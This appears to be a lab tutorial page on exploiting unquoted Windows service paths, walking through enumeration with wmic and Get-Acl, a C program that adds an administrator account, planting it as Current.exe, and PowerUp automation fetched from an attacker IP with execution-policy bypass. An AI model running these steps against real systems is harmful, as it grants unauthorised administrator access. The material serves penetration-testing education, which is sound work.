---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Unquoted Service Paths

## Background

This [attack vector](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability) has to do with the way in which Windows resolves unquoted file paths in their services. This technique can be used when an attacker has Write permissions to a service's main directory or subdirectories but cannot replace files within them.

Each Windows service _maps to an executable file that will be run when the service is started_. If the **path of this file contains one or more spaces and is not enclosed within quotes**, it may be turned into an opportunity for a privilege escalation attack.

For example, a program such as `myprogram.exe` can exist in the folder `C:\temp\My Folder\`. In Windows, a service can specifically can point to `C:\temp\My Folder\myprogram.exe` or it can enclose the absolute path in double quotes such as `“c:\temp\My Folder\myprogram.exe”`. The operating system will resolve the path to the program in either case and run the service. This is a design decision by Microsoft.

When a service is started the Windows [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function is used. Reviewing the first parameter of the function, `lpApplicationName` is used to specify the name and optionally the path to the executable file. If the provided string contains spaces and is not enclosed within quotation marks, it can be interpreted in various ways because it is unclear to the function where the file name ends and the arguments begin. To determine this, the function starts interpreting the path **from left to right until a space is reached**. For every space in the file path, the function uses the preceding part as file name by adding `.exe` and the rest as arguments.

For example, if the service requested is at the location `C:\Program Files\My Program\My Service\service.exe` and the path is unquoted Windows will use the following order in its attempt to start the service

1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Program\My.exe`
4. `C:\Program Files\My Program\My Service\service.exe`

If the attacker has the ability to write into one of these directories, the could create a malicious executable and place it earlier in the search chain than the valid service. In this case if the attacker had Write permission to the `C:\` or `C:\Program Files` directory they could drop a malicious executable called `Program.exe` or `My.exe` respectively. However this permission scenario is fairly unlikely.

It is more likely the attacker could have Write permission to the `C:\Program Files\My Program` directory and thus could create a malicious `My.exe` and it would be run instead of the valid service.

## Example

This example will rely on a machine (`CLIENTWK220`) to which the attacker is assumed to have access as a non-privileged user (`steve`) via RDP.

### Service Enumeration

Once connected to the machine, the attacker can enumerate all Stopped and Running services with the following command:

{% code overflow="wrap" %}
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
{% endcode %}

When run the attacker finds there are quite a few services running

```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName

Name                                      State   PathName
----                                      -----   --------
AJRouter                                  Stopped C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
...
FontCache                                 Running C:\Windows\system32\svchost.exe -k LocalService -p
...
GammaService                              Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Of the running services, the most interesting is `GammaService`. It appears to exist at `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe` and the path to the binary is unquoted. This means when the service is started the following attempts will be made to find its binary:

1. `C:\Program.exe`
2. `C:\Program Files\Enterprise.exe`
3. `C:\Program Files\Enterprise Apps\Current.exe`
4. `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`

If `steve` has write access to any of the directories that will be searched, the attacker could drop a malicious executable.

#### More Efficient Searching

As noted in an [another section](../../../core-concepts/windows-services.md#wmic), WMIC can be used to enumerate services:

```powershell
wmic service get name,pathname
```

In this instance it can be particularly helpful as the output can be piped directly to [findstr](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) utility. findstr can be used to check for missing quotes in the service path as shown here:

{% code overflow="wrap" %}
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
{% endcode %}

* The first `findstr` command is used to match only services with binaries outside `C:\Windows\`
  * `/i` is used for case-insensitive matching
  * `/v` prints only lines that do not match
  * `"C:\Windows\\"` is what is being matched (or ignored in this case due to the `/v` flag)
* The second `findstr` is used to look for services with unquoted binary paths
  * The flag setup is the same as above, it is simply checking for the existence of any quotation marks "`"`" and outputting only lines that do not match with the `/v` flag

When run **in `cmd.exe`** on the target machine it does indeed reveal `GammaService`:

```
C:\Users\steve>wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName                                                                     
BetaService                                C:\Users\steve\Documents\BetaServ.exe                                        
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe               
LSM                                                                                                                     
mysql                                      C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
NetSetupSvc
```

### Permissions Checks

The most likely scenario is that `steve` has access to `C:\Program Files\Enterprise Apps\` (`C:\` or `C:\Program Files` would be unlikely) so it is worth starting there. The [`Get-Acl`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.4) cmdlet can be used in a similar manner to what was demonstrated [here](service-binary-hijacking.md#get-acl) to determine the access permissions for a particular directory:

```powershell
(Get-Acl -Path "C:\Program Files\Enterprise Apps\").Access
```

This will show the machine's groups and their permissions for the directory in question. This can then be cross-referenced to the current user's group memberships (shown via `whoami /groups`) for an overlap. On the target machine the output of these commands is:

```powershell
PS C:\Users\steve> (Get-Acl -Path "C:\Program Files\Enterprise Apps\").Access

...

FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
Prop

...

FileSystemRights  : Write, ReadAndExecute, Synchronize
AccessControlType : Allow
IdentityReference : BUILTIN\Users
IsInherited       : False
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

PS C:\Users\steve> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                            Attributes
====================================== ================ ============================================== ==================================================
...
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
...
```

There appears to be an overlap, `steve` is a member of the `BUILTIN\Users` group and it seems that members of that group have Write permissions to the `C:\Program Files\Enterprise Apps` directory on this machine. That means the attacker should be able to create an executable called `Current.exe` and place it in `C:\Program Files\Enterprise Apps` to insert it into the search order.

### Exploitation

#### Binary Creation

Replacing the binary is very much the same as what was seen in [another example](service-binary-hijacking.md#replacing-the-binary), except in this case `adduser.c` must be compiled to an executable called `Current.exe` (to be placed in `C:\Program Files\Enterprise Apps`):

{% code title="adduser.c" %}
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
{% endcode %}

As can be seen above, this code adds a new user (`dave2:password123!`) and adds it to the Local Administrators group. This is compiled with the MinGW compiler:

```bash
x86_64-w64-mingw32-gcc adduser.c -o Current.exe
```

#### Execution

Once it is transferred to the home directory of the user (however the attacker chooses to do this), it can be moved to the correct location and executed:

```powershell
PS C:\Users\steve> Move-Item ".\Current.exe" "C:\Program Files\Enterprise Apps\"

PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service], ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand

```

While the attempt to start a service returned an error, it does not mean the attack was unsuccessful. After all, the machine was expecting a legitimate service `.exe` which would have been the actual `GammaService`. However, the attacker dropped their own executable earlier in the path and it is what was actually run (`C:\Program Files\Enterprise Apps\Current.exe`). That `.exe` (compiled from `adduser.c`) was not a valid service and that is likely the source of the error. Checking the list of users on the local machine the attacker can see their exploit was successful as there is indeed a user `dave2` and that user is part of the Administrators group:

```powershell
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

From here the attacker could login as dave2. Alternatively they could use the steps detailed [here](service-dll-hijacking.md#launching-elevated-shell) to launch an elevated shell as the new `dave2` user.

### Automated Exploitation

#### PowerUp

As discussed in [another section](../../enumeration/automated-enumeration.md#powerup), PowerUp is a PowerShell script that can be imported to add a suite of enumeration-related commands. As a quick refresher it can be added to a machine as follows:

```powershell
PS C:\Users\steve> Invoke-WebRequest -uri "http://192.168.45.155:8888/Windows/PowerShell/PrivilegeEscalation/PowerUp.ps1" -OutFile PowerUp.ps1
PS C:\Users\steve> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\steve> . .\PowerUp.ps1
```

* `192.168.45.155` is the IP address of the attacker's machine where an HTTP server with tools is being hosted at port `8888`
* `powershell -ep bypass` is used to bypass the [execution policy](../../../built-in-tools/powershell/#powershell-execution-policy) on this machine

From here the attacker can used the `Get-UnquotedService` cmdlet that is imported by PowerUp:

```powershell
PS C:\Users\steve> Get-UnquotedService


ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\Program Files\Enterprise Apps; IdentityReference=BUILTIN\Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe; IdentityReference=BUILTIN\Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
```

As confirmed by the output, PowerUp does indeed find GammaService as a potential target for this attack vector.

In this case, PowerUp can actually be used to automatically handle the exploitation. This example will use the `Write-ServiceBinary` cmdlet imported by PowerUp. It's default behavior is to create a new user (`john:Password123!`) much like the `adduser.c` code from [above](unquoted-service-paths.md#binary-creation).

The cmdlet is called with the `-Name` and `-Path` arguments to tell the cmdlet the name and executable path of the service:

{% code overflow="wrap" %}
```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
{% endcode %}

Running this on the target machine does indeed result in the creation of a new user (`john`) and the addition of that user to the local Administrators group:

```powershell
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net localgroup Administrators john /add


PS C:\Users\steve> Start-Service GammaService
Start-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service], ServiceCommandException
    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.StartServiceCommand

PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john                     offsec
steve                    WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
john
offsec
The command completed successfully.
```
